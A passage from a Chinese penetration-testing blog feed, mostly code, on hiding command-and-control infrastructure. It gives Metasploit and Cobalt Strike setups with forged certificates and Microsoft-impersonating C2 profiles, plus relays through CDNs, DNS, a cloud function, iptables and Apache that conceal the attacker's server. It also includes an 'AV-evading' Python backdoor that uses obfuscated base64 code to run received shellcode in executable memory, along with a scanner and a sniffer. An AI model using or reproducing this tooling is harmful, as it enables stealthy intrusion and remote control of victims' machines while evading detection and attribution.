StagerVerifySSLCert=true -f exe -o https-b.exe</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">MSF监听上线</span></span><br><span class=\"line\">use exploit/multi/handler</span><br><span class=\"line\">set payload windows/meterpreter/reverse_https</span><br><span class=\"line\">set lhost 0.0.0.0</span><br><span class=\"line\">set lport 5566</span><br><span class=\"line\">set HandlerSSLCert /root/www.baidu.com.pem</span><br><span class=\"line\">set StagerVerifySSLCert true</span><br><span class=\"line\">run</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">impersonate_ssl模块：</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">此外Metasploit框架还有一个auxiliary/gather/impersonate_ssl模块，可以用来自动从信任源创建一个虚假证书，十分方便：</span></span><br><span class=\"line\">use auxiliary/gather/impersonate_ssl</span><br><span class=\"line\">set RHOST [http://www.baidu.com](http://www.baidu.com)</span><br><span class=\"line\">run</span><br></pre></td></tr></table></figure>\n<h4 id=\"cs-通讯特征修改\"><a class=\"markdownIt-Anchor\" href=\"#cs-通讯特征修改\">#</a> CS 通讯特征修改</h4>\n<p>解决 HTTP/S 通讯证书及流量特征被特征标示问题、JDK Keytool 修改 CS 特征。修改默认端口：编辑 teamserver 文件，更改 server port 部分 50000 。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">a. 去除store证书特征：</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">查看证书指纹：</span></span><br><span class=\"line\">keytool -list -v -keystore cobaltstrike.store</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">生成证书指纹</span></span><br><span class=\"line\">keytool -keystore cobaltstrike1.store -storepass 123456 -key pass 123456 -genkey -keyalg RSA -alias xiaodi8.com -dname &quot;CN=xiaodi8 e-Szigno Root CA, OU=e-Szigno CA, O=xiaodi8 Ltd., L=Budapest, S=HU, C=HU&quot;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">应用证书指纹</span></span><br><span class=\"line\">keytool -importkeystore -srckeystore cobaltstrike1.store -dest</span><br><span class=\"line\">keystore cobaltstrike1.store -deststoretype pkcs12</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">b. 去除流量通讯特征：</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">规则资源：https://github.com/xx0hcd/Malleable-C2-Profiles与https://github.com/FortyNorthSecurity/C2concealer</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">创建C2文件：xiaodi.Profiles</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">写入通讯规则: UA头&amp;GET&amp;POST&amp;心跳&amp;证书等</span></span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">测试规则正常</span></span><br><span class=\"line\">./c2lint xiaodi.prifile</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">c.加载C2规则启动：</span></span><br><span class=\"line\">./teamserver ip 密码 xiaodi.Profiles</span><br><span class=\"line\"></span><br><span class=\"line\">https-certificate &#123;</span><br><span class=\"line\">set CN &quot;xiaodi8&quot;;</span><br><span class=\"line\">set O &quot;Microsoft&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">set C &quot;en&quot;;</span><br><span class=\"line\">set L &quot;US&quot;;</span><br><span class=\"line\">set OU &quot;Microsoft&quot;;</span><br><span class=\"line\">set ST &quot;US&quot;;</span><br><span class=\"line\">set validity &quot;365&quot;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">d.设置，修改成你的证书名称和证书密码</span><br><span class=\"line\">code-signer&#123;</span><br><span class=\"line\">set keystore &quot;xiaodi.store&quot;;</span><br><span class=\"line\">set password &quot;xiaodi&quot;;</span><br><span class=\"line\">set alias &quot;xiaodi8.com&quot;;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"c2-服务器隐藏\"><a class=\"markdownIt-Anchor\" href=\"#c2-服务器隐藏\">#</a> C2 服务器隐藏</h4>\n<p>防封锁处置 IP 地址：域前置、CDN、云函数，网盘第三方上线等</p>\n<p>（ 1 ）cs 采用 CDN 上线</p>\n<p>解决 HTTPS-SSL 通讯被朔源 IP 封锁问题<br>\n配置：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvTWdoRmdlZ2RwM2wzdEZFM2hPdmNZdw==\">https://mp.weixin.qq.com/s/MghFgegdp3l3tFE3hOvcYw</span><br>\n 阿里云备案域名 &amp; 全站加速 CDN 配置、CS 创建监听器 - HTTPS/Stager/Header、生成后门 - 进程网络状态 &amp; 威胁情报平台。</p>\n<p>（ 2 ）域前置 - CDN 配合<br>\n此方案在大部分 IDC 不再支持</p>\n<p>（ 3 ）DNS 协议 - 域名记录解析</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">a. 域名解析设置A,NS记录</span></span><br><span class=\"line\">ns1 ns cs.xxx.com</span><br><span class=\"line\">ns2 ns cs.xxx.com</span><br><span class=\"line\">cs A xx.xx.xx.xx(CS的IP)</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">b. CS监听器-DNS</span></span><br><span class=\"line\">Beacon DNS</span><br><span class=\"line\">DNS地址配置：ns1.xxx.com ns2.xxx.com</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">c. 执行后checkin唤醒</span></span><br></pre></td></tr></table></figure>\n<p>（ 4 ）云函数 - 腾讯云操作</p>\n<p>创建云函数：腾讯云 - 云产品 - 云函数 - 函数服务 - 新建</p>\n<p>创建函数服务：选择从头开始 - 函数类型选择事件函数 - 函数名称任意 - 运行环境选择 python3.6 - 并复制如下代码并修改 CS 的 IP - 点击完成</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">-*- coding: utf8 -*-</span></span><br><span class=\"line\">import json,requests,base64</span><br><span class=\"line\">def main_handler(event, context):</span><br><span class=\"line\">C2=&#x27;https://XXXX&#x27; # 修改为自己C2服务器地址</span><br><span class=\"line\">path=event[&#x27;path&#x27;]</span><br><span class=\"line\">headers=event[&#x27;headers&#x27;]</span><br><span class=\"line\">print(event)</span><br><span class=\"line\">if event[&#x27;httpMethod&#x27;] == &#x27;GET&#x27; :</span><br><span class=\"line\">resp=requests.get(C2+path,headers=headers,verify=False)</span><br><span class=\"line\">else:</span><br><span class=\"line\">resp=requests.post(C2+path,data=event[&#x27;body&#x27;],headers=headers,verify=False)</span><br><span class=\"line\">print(resp.headers)</span><br><span class=\"line\">print(resp.content)</span><br><span class=\"line\">response=&#123;</span><br><span class=\"line\">&quot;isBase64Encoded&quot;: True,</span><br><span class=\"line\">&quot;statusCode&quot;: resp.status_code,</span><br><span class=\"line\">&quot;headers&quot;: dict(resp.headers),</span><br><span class=\"line\">&quot;body&quot;: str(base64.b64encode(resp.content))[2:-1]</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">return response</span><br></pre></td></tr></table></figure>\n<p>创建触发器：触发方式选择 API 网关触发 - 勾选启用集成响应 - 点击提交配置触发器：点击 API 服务名对触发器进行配置，将路径修改为 /，然后点击立即完成配置 profile 文件 - 触发 URL：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">set sample_name &quot;t&quot;;</span><br><span class=\"line\">set sleeptime &quot;3000&quot;;</span><br><span class=\"line\">set jitter &quot;0&quot;;</span><br><span class=\"line\">set maxdns &quot;255&quot;;</span><br><span class=\"line\">set useragent &quot;Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/5.0)&quot;;</span><br><span class=\"line\">http-get &#123;</span><br><span class=\"line\">  set uri &quot;/api/x&quot;;</span><br><span class=\"line\">  client &#123;</span><br><span class=\"line\">    header &quot;Accept&quot; &quot;*/*&quot;;</span><br><span class=\"line\">    metadata &#123;</span><br><span class=\"line\">      base64;</span><br><span class=\"line\">      prepend &quot;SESSIONID=&quot;;</span><br><span class=\"line\">      header &quot;Cookie&quot;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  server &#123;</span><br><span class=\"line\">    header &quot;Content-Type&quot; &quot;application/ocsp-response&quot;;</span><br><span class=\"line\">    header &quot;content-transfer-encoding&quot; &quot;binary&quot;;</span><br><span class=\"line\">    header &quot;Server&quot; &quot;Nodejs&quot;;</span><br><span class=\"line\">    output &#123;</span><br><span class=\"line\">      base64;</span><br><span class=\"line\">      print;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">http-stager &#123;</span><br><span class=\"line\">  set uri_x86 &quot;/vue.min.js&quot;;</span><br><span class=\"line\">  set uri_x64 &quot;/bootstrap-2.min.js&quot;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">http-post &#123;</span><br><span class=\"line\">  set uri &quot;/api/y&quot;;</span><br><span class=\"line\">  client &#123;</span><br><span class=\"line\">    header &quot;Accept&quot; &quot;*/*&quot;;</span><br><span class=\"line\">    id &#123;</span><br><span class=\"line\">       base64;</span><br><span class=\"line\">       prepend &quot;JSESSION=&quot;;</span><br><span class=\"line\">       header &quot;Cookie&quot;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    output &#123; </span><br><span class=\"line\">       base64;</span><br><span class=\"line\">       print;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  server &#123;</span><br><span class=\"line\">    header &quot;Content-Type&quot; &quot;application/ocsp-response&quot;;</span><br><span class=\"line\">    header &quot;content-transfer-encoding&quot; &quot;binary&quot;;</span><br><span class=\"line\">    header &quot;Connection&quot; &quot;keep-alive&quot;;</span><br><span class=\"line\">    output &#123;</span><br><span class=\"line\">      base64;</span><br><span class=\"line\">      print;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>启动 CS 加载 profile：./teamserver IP 密码 xxx.profile</p>\n<p>（ 5 ）端口转发 - Iptables</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">转发机设置转发：(80改 443 即https)</span></span><br><span class=\"line\">iptables -I INPUT -p tcp -m tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 47.94.236.117:80</span><br><span class=\"line\">iptables -t nat -A POSTROUTING -j MASQUERADE</span><br><span class=\"line\">iptables -I FORWARD -j ACCEPT</span><br><span class=\"line\">iptables -P FORWARD ACCEPT</span><br><span class=\"line\">sysctl net.ipv4.ip_forward=1</span><br></pre></td></tr></table></figure>\n<p>CS 监听器配置转发机 IP</p>\n<p>（ 6 ）中间件反向代理 - Apache</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">代理机安装Apache：</span></span><br><span class=\"line\">apt-get install apache2</span><br><span class=\"line\">a2enmod proxy proxy_ajp proxy_balancer proxy_connect proxy_http</span><br><span class=\"line\">systemctl restart apache2</span><br><span class=\"line\">/etc/apache2/sites-enabled/000-default.conf</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">中间件设置转发：</span></span><br><span class=\"line\">http:</span><br><span class=\"line\">ProxyPass &quot;/&quot; &quot;http://CS的IP/&quot;</span><br><span class=\"line\">ProxyPassReverse &quot;/&quot; &quot;http://CS的IP/&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">https:</span><br><span class=\"line\">ProxyPass &quot;/&quot; &quot;https://CS的IP/&quot;</span><br><span class=\"line\">ProxyPassReverse &quot;/&quot; &quot;https://CS的IP/&quot;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">重启Apache服务：</span></span><br><span class=\"line\">service apache2 restart</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">CS监听器配置转发机IP</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"python自动化\"><a class=\"markdownIt-Anchor\" href=\"#python自动化\">#</a> python 自动化</h3>\n<h4 id=\"socket免杀后门\"><a class=\"markdownIt-Anchor\" href=\"#socket免杀后门\">#</a> socket 免杀后门</h4>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">client.py</span></span><br><span class=\"line\">import socket,sys</span><br><span class=\"line\"></span><br><span class=\"line\">ip=sys.argv[1]</span><br><span class=\"line\">port=sys.argv[2]</span><br><span class=\"line\">s1=socket.socket()</span><br><span class=\"line\">s1.connect((ip,int(port)))</span><br><span class=\"line\">while True:</span><br><span class=\"line\">  cmdline=input(&#x27;please input cmdline:&#x27;)</span><br><span class=\"line\">  s1.send(cmdline.encode())</span><br><span class=\"line\">  cmddata=s1.recv(1024).decode()</span><br><span class=\"line\">  print(cmddata)</span><br><span class=\"line\">  s1.close()</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">server.py</span></span><br><span class=\"line\">import socket,os,ctypes,base64</span><br><span class=\"line\"></span><br><span class=\"line\">s=socket.socket()</span><br><span class=\"line\">s.bind((&#x27;0.0.0.0&#x27;,9999))</span><br><span class=\"line\">s.listen(5)</span><br><span class=\"line\">def zx(s):</span><br><span class=\"line\">  sc = base64.b64decode(s)</span><br><span class=\"line\">  code=&#x27;cnd4cGFnZSA9IGN0eXBlcy53aW5kbGwua2VybmVsMzIuVmlydHVhbEFsbG9jKDAsIGxlbihzYyksIDB4MTAwMCwgMHg0MCkKY3R5cGVzLndpbmRsbC5r ZXJuZWwzMi5SdGxNb3ZlTWVtb3J5KHJ3eHBhZ2UsIGN0eXBlcy5jcmVhdGVfc3 RyaW5nX2J1ZmZlcihzYyksIGxlbihzYykpCmhhbmRsZSA9IGN0eXBlcy53aW5kbGwua2VybmVsMzIuQ3JlYXRlVGhyZWFkKDAsIDAsIHJ3eHBhZ2UsIDAsIDAsIDA pCmN0eXBlcy53aW5kbGwua2VybmVsMzIuV2FpdEZvclNpbmdsZU9iamVjdChoYW5kbGUsIC0xKQ==&#x27;</span><br><span class=\"line\">  c=base64.b64decode(code)</span><br><span class=\"line\">  eval(c)</span><br><span class=\"line\">  while 1:</span><br><span class=\"line\">    sock,addr=s.accept()</span><br><span class=\"line\">    print(sock, addr)</span><br><span class=\"line\">  while 1:</span><br><span class=\"line\">    cmd=sock.recv(10241).decode()</span><br><span class=\"line\">    print(cmd)</span><br><span class=\"line\">    print(type(cmd))</span><br><span class=\"line\">    zx(cmd)</span><br><span class=\"line\">    print(cmd_data)</span><br><span class=\"line\">    print(type(cmd_data))</span><br><span class=\"line\">    sock.send(cmd_data.encode())</span><br><span class=\"line\">    sock.close()</span><br></pre></td></tr></table></figure>\n<h4 id=\"多线程全端口扫描\"><a class=\"markdownIt-Anchor\" href=\"#多线程全端口扫描\">#</a> 多线程全端口扫描</h4>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import socket</span><br><span class=\"line\">import threading</span><br><span class=\"line\">import queue</span><br><span class=\"line\"></span><br><span class=\"line\">def port_scan():</span><br><span class=\"line\">  while not q.empty():</span><br><span class=\"line\">    ip = &#x27;127.0.0.1&#x27;</span><br><span class=\"line\">    port = q.get()</span><br><span class=\"line\">    s = socket.socket()</span><br><span class=\"line\">    if s.connect_ex((ip, port)) == 0:</span><br><span class=\"line\">      print(&quot;%d is open&quot; %port)</span><br><span class=\"line\">    else:</span><br><span class=\"line\">      pass</span><br><span class=\"line\">    s.close()</span><br><span class=\"line\"></span><br><span class=\"line\">if __name__ == &#x27;__main__&#x27;:</span><br><span class=\"line\">  q = queue.Queue()</span><br><span class=\"line\">  for port in range(1,65536):</span><br><span class=\"line\">    q.put(port)</span><br><span class=\"line\">      for i in range(30):</span><br><span class=\"line\">      t = threading.Thread(target=port_scan)</span><br><span class=\"line\">      t.start()</span><br></pre></td></tr></table></figure>\n<h4 id=\"scapy流量分析\"><a class=\"markdownIt-Anchor\" href=\"#scapy流量分析\">#</a> scapy 流量分析</h4>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from scapy.all import *</span><br><span class=\"line\"></span><br><span class=\"line\">def packet_callback(packet):</span><br><span class=\"line\">  print(packet.show())</span><br><span class=\"line\">  data=bytes(packet[TCP].payload)</span><br><span class=\"line\">    for info in data.split(b&#x27;\\n&#x27;):</span><br><span class=\"line\">    print(info)</span><br><span class=\"line\">    if b&#x27;Content-Disposition: form-data; name=&quot;&#x27; in info:</span><br><span class=\"line\">      print(&#x27;文件上传攻击中...&#x27;)</span><br><span class=\"line\">    pass</span><br><span class=\"line\"></span><br><span class=\"line\">if __name__ == &#x27;__main__&#x27;:</span><br><span class=\"line\">  sniff(filter=&#x27;host 192.168.1.107 and tcp port 80&#x27;,iface=&#x27;以太网&#x27;,prn=packet_callback,store=0)</span><br></pre></td></tr></table></figure>\n<h4 id=\"文件行为监控\"><a class=\"markdownIt-Anchor\" href=\"#文件行为监控\">#</a> 文件行为监控</h4>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from watchdog.observers import Observer</span><br><span class=\"line\">from watchdog.events import *</span><br><span class=\"line\">import time</span><br><span class=\"line\"></span><br><span class=\"line\">class FileEventHandler(FileSystemEventHandler):</span><br><span class=\"line\">  def __init__(self):</span><br><span class=\"line\">    FileSystemEventHandler.__init__(self)</span><br><span class=\"line\"></span><br><span class=\"line\">  def on_moved(self, event):</span><br><span class=\"line\">    if event.is_directory:</span><br><span class=\"line\">      print(&quot;directory moved from &#123;0&#125; to &#123;1&#125;&quot;.format(event.src_path,event.dest_path))</span><br><span class=\"line\">    else:</span><br><span class=\"line\">      print(&quot;file moved from &#123;0&#125; to &#123;1&#125;&quot;.format(event.src_path,event.dest_path))</span><br><span class=\"line\">  </span><br><span class=\"line\">  def on_created(self, event):</span><br><span class=\"line\">    if event.is_directory:</span><br><span class=\"line\">      print(&quot;directory created:&#123;0&#125;&quot;.format(event.src_path))</span><br><span class=\"line\">    else:</span><br><span class=\"line\">      print(&quot;file created:&#123;0&#125;&quot;.format(event.src_path))</span><br><span class=\"line\">  </span><br><span class=\"line\">  def on_deleted(self, event):</span><br><span class=\"line\">    if event.is_directory:</span><br><span class=\"line\">      print(&quot;directory deleted:&#123;0&#125;&quot;.format(event.src_path))</span><br><span class=\"line\">    else:</span><br><span class=\"line\">      print(&quot;file deleted:&#123;0&#125;&quot;.format(event.src_path))</span><br><span class=\"line\">  </span><br><span class=\"line\">  def on_modified(self, event):</span><br><span class=\"line\">    if event.is_directory:</span><br><span class=\"line\">      print(&quot;directory modified:&#123;0&#125;&quot;.format(event.src_path))</span><br><span class=\"line\">    else:</span><br><span class=\"line\">      print(&quot;file modified:&#123;0&#125;&quot;.format(event.src_path))</span><br><span class=\"line\"></span><br><span class=\"line\">if __name__ == &quot;__main__&quot;:</span><br><span class=\"line\">  observer = Observer()</span><br><span class=\"line\">  event_handler = FileEventHandler()</span><br><span class=\"line\">  observer.schedule(event_handler, r&quot;C:\\Users\\wyq\\Desktop\\1&quot;, True)</span><br><span class=\"line\">  observer.start()</span><br><span class=\"line\">  try:</span><br><span class=\"line\">    while True:</span><br><span class=\"line\">      time.sleep(1)</span><br><span class=\"line\">  except KeyboardInterrupt:</span><br><span class=\"line\">    observer.stop()</span><br><span class=\"line\">    observer.join()</span><br></pre></td></tr></table></figure>\n",
            "tags": [
                "渗透测试"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2022/12/30/SAFE/3%20%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/",
            "url": "http://www.n1h1l157.live/2022/12/30/SAFE/3%20%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/",
            "title": "XD22 3 服务攻防",
            "date_published": "2022-12-29T16:00:00.000Z",
